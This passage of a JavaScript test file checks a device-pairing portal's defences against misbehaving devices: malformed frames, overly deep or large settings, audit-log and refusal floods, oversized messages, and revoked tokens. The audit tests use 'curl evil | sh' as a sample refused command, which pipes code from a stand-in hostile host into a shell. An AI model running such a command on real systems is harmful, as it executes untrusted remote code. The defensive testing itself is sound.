    device.send({ jsonrpc: "2.0", id: 4242, error: { code: -32700, message: bad } });
    // As the answer to a call: the portal's own error, with a fixed text.
    await assert.rejects(linkOf(id).call("fs.stat", { path: "/x", ctx: { chat: "c", tainted: false } }), (e) => e.code === -32005 && e.message === "the device refused");
    assert.equal((await linkOf(id).call("device.info", {})).name, "laptop", "the same link goes on");
    assert.equal(linkOf(id).closed, false);
    assert.equal(lines.length, 1);
    assert.match(lines[0], /refused a frame: ""$/);
  } finally {
    console.warn = warn;
  }
  device.ws.close(1001);
});

test("a frame that makes the portal throw ends that link only, with a protocol violation", async () => {
  const { connector_token: token, device_id: id } = await paired("breaker");
  const { connector_token: otherToken, device_id: otherId } = await paired("bystander");
  const { device } = await connect(token);
  const other = await connect(otherToken);
  await until(() => linkOf(id)?.info && linkOf(otherId)?.info, "both devices");
  const lines = [];
  const warn = console.warn;
  console.warn = (...args) => lines.push(args.join(" "));
  const boom = () => {
    throw new Error("a listener broke on\nthe frame");
  };
  hub.on("approval", boom);
  try {
    device.notify("approval.requested", { id: 1, call: null, chat: "c1", tool: "exec", target: "make", reasons: [], preview: null, choices: ["once", "deny"], max_minutes: 0, created_ms: 1, expires_ms: 2 });
    assert.deepEqual(await device.closed, { code: 1008, reason: "the frame could not be handled" });
  } finally {
    hub.off("approval", boom);
    console.warn = warn;
  }
  await until(() => !linkOf(id), "the link to go");
  assert.equal(lines.length, 1);
  assert.match(lines[0], /^\[devices\] \S+ sent a frame the portal could not handle, and the link is closed: "a listener broke on\\nthe frame"$/);
  assert.equal(linkOf(otherId).closed, false, "the other device is not touched");
  assert.equal((await linkOf(otherId).call("device.info", {})).name, "laptop");
  other.device.ws.close(1001);
});

// The settings as a policy.get answers them, and a frame as text: JSON.stringify on Node 22 cannot write a document 5,000 levels deep, not even in a test.
const policyOf = (version, settings = {}) => ({ portal_policy: "read", version, settings: { policy: { mode: "ask" }, ...settings }, device_only: [] });
const nested = (levels) => {
  let v = {};
  for (let i = 1; i < levels; i++) v = { a: v };
  return v;
};
const deepSettings = `{"x":${"[".repeat(5000)}${"]".repeat(5000)}}`;
const SHARES = { hello: { capabilities: ["fs", "exec", "approvals", "policy"] } };

test("a device's settings are kept only as deep and as large as the page can carry", async () => {
  const { connector_token: token, device_id: id } = await paired("settler");
  const { device } = await connect(token, { ...SHARES, answers: { "policy.get": policyOf("v1") } });
  await until(() => linkOf(id)?.policy, "the settings");
  const link = linkOf(id);
  // What the device said, once the portal has read all of it: the answer to a call comes after what was sent before.
  const read = () => link.call("device.info", {});

  // What a page can carry is taken, up to the limits.
  device.notify("policy.changed", policyOf("v2", { deep: nested(MAX_SETTINGS_DEPTH - 1), wide: "x".repeat(MAX_SETTINGS_CHARS - 1000) }));
  await until(() => link.policy.version === "v2", "settings within the limits");
  // Past them, not: the earlier settings stay, and the link goes on.
  for (const [what, frame] of [
    ["5,000 levels deep", `{"jsonrpc":"2.0","method":"policy.changed","params":{"portal_policy":"read","version":"deep","settings":${deepSettings},"device_only":[]}}`],
    ["one level too deep", JSON.stringify({ jsonrpc: "2.0", method: "policy.changed", params: policyOf("levels", { deep: nested(MAX_SETTINGS_DEPTH) }) })],
    ["too large", JSON.stringify({ jsonrpc: "2.0", method: "policy.changed", params: policyOf("large", { wide: "x".repeat(MAX_SETTINGS_CHARS) }) })],
  ]) {
    device.ws.send(frame);
    await read();
    assert.equal(link.policy.version, "v2", `${what}: not taken`);
  }
  assert.doesNotThrow(() => JSON.stringify(link.policy), "what the device list carries");
  assert.equal(link.closed, false);
  device.ws.close(1001);
});

test("a device's answer to policy.get is kept only as deep as the page can carry", async () => {
  const { connector_token: token, device_id: id } = await paired("settler-get");
  let sent = "";
  const { device } = await connect(token, {
    ...SHARES,
    answers: {
      "policy.get": (_params, rid, d) => {
        sent = `{"jsonrpc":"2.0","id":${rid},"result":{"portal_policy":"read","version":"deep","settings":${deepSettings},"device_only":[]}}`;
        d.ws.send(sent);
      },
    },
  });
  await until(() => linkOf(id)?.info && device.asked("policy.get").length > 0, "the connect");
  await linkOf(id).call("device.info", {});
  assert.ok(sent.length > 10_000, "the answer went out before the call above");
  assert.equal(linkOf(id).policy, undefined);
  assert.equal(linkOf(id).closed, false);
  device.ws.close(1001);
});

test("a device that does not say it shares its settings cannot change them", async () => {
  const { connector_token: token, device_id: id } = await paired("settler-quiet");
  const { device } = await connect(token);
  await until(() => linkOf(id)?.info, "device.info");
  device.notify("policy.changed", policyOf("v9"));
  await linkOf(id).call("device.info", {});
  assert.equal(linkOf(id).policy, undefined);
  assert.equal(device.asked("device.info").length, 2, "its own connect and the call above: none for the change");
  device.ws.close(1001);
});

test("a device that sends refusals as fast as it can writes one log line and a count, not a line each", async () => {
  const { connector_token: token, device_id: id } = await paired("chatty");
  const { device } = await connect(token);
  await until(() => linkOf(id)?.info, "device.info");
  const lines = [];
  const warn = console.warn;
  console.warn = (...args) => lines.push(args.join(" "));
  Object.assign(TIMING, { refusedLogMs: 200 });
  try {
    for (let n = 0; n < 500; n++) device.send({ jsonrpc: "2.0", error: { code: -32700, message: `bad ${n}` } });
    // Everything the device sent first has been read once its answer to a call is in.
    await linkOf(id).call("device.info", {});
    assert.equal(lines.length, 1, "the first of the interval");
    assert.match(lines[0], /refused a frame: "bad 0"/);
    await until(() => lines.length === 2, "the summary");
    assert.match(lines[1], /^\[devices\] \S+ refused 499 more frames in the last 0 seconds$/);
    // The next interval starts with a line of its own again.
    device.send({ jsonrpc: "2.0", error: { code: -32700, message: "again" } });
    await until(() => lines.length === 3, "the next first line");
    assert.match(lines[2], /refused a frame: "again"/);
  } finally {
    console.warn = warn;
    Object.assign(TIMING, { refusedLogMs: 60_000 });
  }
  device.ws.close(1001);
});

test("a device cannot push the portal's own entries out of the audit log, nor write it faster than a few a second", async () => {
  const { connector_token: token, device_id: id } = await paired("flooder");
  const { device } = await connect(token);
  await until(() => linkOf(id)?.info, "device.info");
  getDb().prepare("DELETE FROM audit").run();
  recordAudit({ kind: "refused", tool: "bash", subject: "curl evil | sh", reason: "the guard" });

  // The rate: a burst goes through, the rest is counted, and the next event that is taken says how many.
  const event = (n) => ({ time_ms: n, chat: "c-flood", tool: "read", target: `/x/${n}`, decision: "allowed", reason: null });
  for (let n = 0; n < AUDIT_BURST * 3; n++) device.notify("audit", event(n));
  // Read in order: once the device's answer to a call is in, so is everything it sent before.
  await linkOf(id).call("device.info", {});
  const taken = listAudit(5000).filter((e) => e.session_id === "c-flood").length;
  assert.ok(taken >= AUDIT_BURST && taken <= AUDIT_BURST + 5, `${taken} taken of ${AUDIT_BURST * 3}`);
  await sleep(600);
  device.notify("audit", event(9999));
  await until(() => listAudit(5000).some((e) => /events left out/.test(e.reason)), "the note");
  assert.match(listAudit(5000).find((e) => /events left out/.test(e.reason)).reason, new RegExp(`^flooder: ${AUDIT_BURST * 3 - taken} events left out`));

  // The quota: the devices' rows are trimmed among themselves, whoever writes them.
  for (let n = 0; n < AUDIT_DEVICE_KEEP * 3; n++) recordAudit({ kind: "device", tool: "read", subject: String(n), reason: "flooder: allowed" });
  const rows = listAudit(5000);
  assert.equal(rows.filter((e) => e.kind === "device").length, AUDIT_DEVICE_KEEP);
  assert.deepEqual(rows.filter((e) => e.kind === "refused").map((e) => e.subject), ["curl evil | sh"]);
  assert.equal(rows.find((e) => e.kind === "device").subject, String(AUDIT_DEVICE_KEEP * 3 - 1), "the newest of theirs stay");
  getDb().prepare("DELETE FROM audit").run();
  device.ws.close(1001);
});

test("reconnecting does not give a device a new allowance, and what was left out is still noted", async () => {
  const { connector_token: token, device_id: id } = await paired("redialer");
  getDb().prepare("DELETE FROM audit").run();
  recordAudit({ kind: "refused", tool: "bash", subject: "curl evil | sh", reason: "the guard" });
  const event = (chat, n) => ({ time_ms: n, chat, tool: "read", target: `/x/${n}`, decision: "allowed", reason: null });
  const rows = () => listAudit(5000).filter((e) => e.kind === "device" && e.tool !== "audit");
  let sent = 0;
  // What the device really reported, then a flood on the same connection, then many connections with a flood each.
  const started = Date.now();
  let { device } = await connect(token);
  await until(() => linkOf(id)?.info, "device.info");
  for (let n = 0; n < 10; n++, sent++) device.notify("audit", event("c-genuine", n));
  for (let n = 0; n < 200; n++, sent++) device.notify("audit", event("c-flood", n));
  await linkOf(id).call("device.info", {});
  for (let round = 0; round < 12; round++) {
    device.ws.close(1001);
    await until(() => !linkOf(id), "the link to go");
    ({ device } = await connect(token));
    await until(() => linkOf(id)?.info, "device.info");
    for (let n = 0; n < 50; n++, sent++) device.notify("audit", event("c-again", n));
    await linkOf(id).call("device.info", {});
  }
  const seconds = (Date.now() - started) / 1000;
  const taken = rows().length;
  assert.ok(taken <= AUDIT_BURST + Math.ceil(seconds * 5) + 2, `${taken} of ${sent} taken in ${seconds}s`);
  assert.equal(rows().filter((e) => e.session_id === "c-genuine").length, 10, "what it reported first is still there");
  assert.deepEqual(listAudit(5000).filter((e) => e.kind === "refused").map((e) => e.subject), ["curl evil | sh"]);
  // The count was kept through every connection, and is written once the device has a token to spare, though it says nothing more.
  const noted = () => listAudit(5000).filter((e) => /events left out/.test(e.reason)).reduce((n, e) => n + Number(/: (\d+) events left out/.exec(e.reason)[1]), 0);
  await until(() => taken + noted() === sent, "every event taken or noted");
  device.ws.close(1001);
  getDb().prepare("DELETE FROM audit").run();
});

test("a message over 4 MiB ends the connection", async () => {
  const { connector_token: token, device_id: id } = await paired("big");
  const { device } = await connect(token);
  await until(() => linkOf(id)?.info, "device.info");
  device.ws.send(Buffer.alloc(4 * 1024 * 1024 + 10, 1), { binary: true });
  assert.equal((await device.closed).code, 1009);
  await until(() => !linkOf(id), "the link to go");
});

test("a removed device is cut off at once, and its token opens nothing after", async () => {
  const { connector_token: token, device_id: id } = await paired("gone");
  const { device } = await connect(token, { answers: { "fs.stat": () => undefined } });
  await until(() => linkOf(id)?.info, "device.info");
  const waiting = linkOf(id).call("fs.stat", { path: "/x", ctx: { chat: "c", tainted: false } });
  store.removeDevice(id);
  dropDevice(id);
  await assert.rejects(waiting, /disconnected/);
  assert.equal((await device.closed).code, CLOSE.revoked);
  assert.equal((await connect(token)).status, 401);
});

test("with the add-on off, or on in a portal without a password, nothing connects or pairs, and anybody is told the same", async () => {
  const { connector_token: token } = await paired("later");
  const ask = async () => {
    const { code } = store.newPairingCode();
    return {
      withToken: await connect(token),
      withoutToken: await connect(undefined),
      wrongToken: await connect(`dnotadevice00000000.${"A".repeat(43)}`),
      pair: await pair({ code, name: "x", os: "linux", arch: "x86_64" }),
    };
  };
  store.setDevicesEnabled(false);
  const off = await ask();
  store.setDevicesEnabled(true);
  const password = process.env.PORTAL_PASSWORD;
  delete process.env.PORTAL_PASSWORD;
  let noPassword;
  try {
    noPassword = await ask();
  } finally {
    process.env.PORTAL_PASSWORD = password;
  }
  for (const answers of [off, noPassword]) {
    assert.deepEqual([answers.withToken.status, answers.withoutToken.status, answers.wrongToken.status, answers.pair.status], [503, 503, 503, 404]);
    assert.deepEqual(answers.withoutToken, answers.withToken, "a token makes no difference");
    assert.deepEqual(answers.wrongToken, answers.withToken);
  }
  // Whether it is the switch or the missing password makes no difference to what is said, and the password is not mentioned.
  assert.deepEqual(noPassword, off);
  assert.doesNotMatch(JSON.stringify(noPassword), /password|PORTAL_|Settings/i);
});
